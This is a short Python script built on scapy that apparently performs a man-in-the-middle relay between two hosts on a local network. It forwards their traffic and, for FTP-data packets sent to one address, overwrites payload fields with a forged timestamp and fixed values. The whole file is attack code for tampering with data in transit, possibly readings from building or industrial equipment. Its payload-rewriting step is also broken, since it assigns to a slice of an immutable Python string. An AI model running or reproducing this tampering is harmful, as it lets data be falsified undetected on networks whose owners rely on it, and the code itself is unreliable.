#import re
#from time import sleep
import binascii
import random, string
from scapy.all import *

DST_IP1 = '192.168.10.10'
DST_IP2 = '192.168.10.50'

#M_MAC = '00:05:1b:a8:6d:d3'#自分のMACアドレス
M_MAC = '00:01:02:03:04:05'#自分のMACアドレス

T_MAC1 = '74:3a:65:84:c7:82'
T_MAC2 = '00:04:01:16:02:1c'
#T_MAC1 = '00:40:1a:1e:e8:35' #192.168.24.10
#T_MAC2 = '74:2b:62:6b:bc:89' #192.168.24.254
#T_MAC1 = '00:50:ff:0b:12:72'#192.168.27.11
#T_MAC2 = '00:40:1a:1e:58:43'#192.168.27.14

KEY = '2c0a'
NUM = '3138'#4byte 3138:18
KAN = '2c'
YEAR = '32303230'#8byte 3230:20
SL = '2f'
MONTH = '3032'#3032:02
DATE = '3230'#3138:18
SPACE = '20'
HOUR = '3133'
COLON = '3a'
MINIT = '3330'
DATA1 = '31353135312e35'#14byte 2e:.
DATA2 = '31353135312e35'
DATA3 = '31353135312e35'

WORD = YEAR + SL + MONTH + SL + DATE + SPACE + HOUR + COLON + MINIT + KAN + DATA1 + KAN + DATA2 + KAN + DATA3

ETHE_TYPE = 0x0800
PROTO_NUM = 6 #tcp:6
PORT_NUM = 20 #ftp_data
CH_POS = 114
TH1 = 848 #WriteProperty:71
PTYPE = 2048 #ipv4:2048
FLAGS = 16

IF = "en8"
FILTER = "ip and ether dst "+ M_MAC


def relay_process(pkt):
    print("roop\n")
    if pkt[Ether].src == T_MAC1:
        pkt[Ether].dst = T_MAC2
        pkt[Ether].src = M_MAC
    elif pkt[Ether].src == T_MAC2:
        pkt[Ether].dst = T_MAC1

    if pkt[IP].proto == PROTO_NUM and pkt[IP].dst == DST_IP1 :
        if pkt[TCP].sport == PORT_NUM and pkt[TCP].flags == FLAGS :
            target(pkt)
        else :sendp(pkt,iface=IF)
    else :sendp(pkt,iface=IF) 

def target(pkt):
    #print("Target!\n")
    #print(pkt[Raw].load.hex())
    bstr = str(pkt[Raw].load.hex())
    
    n = bstr.find(KEY)
    m = bstr.rfind(KEY)
    if n > 1:
        bstr[n+10:n+90] = str(WORD)
        bstr[m+10:m+90] = str(WORD)

    pkt[Raw].load=binascii.unhexlify(bstr)
    pkt[TCP].chksum = None
    #print(bytes(bstr.encode()))
    #print(cstr)
    print(pkt[Raw].load.hex())
    sendp(pkt,iface=IF)

sniff(iface=IF, prn=relay_process, filter=FILTER, store=0)


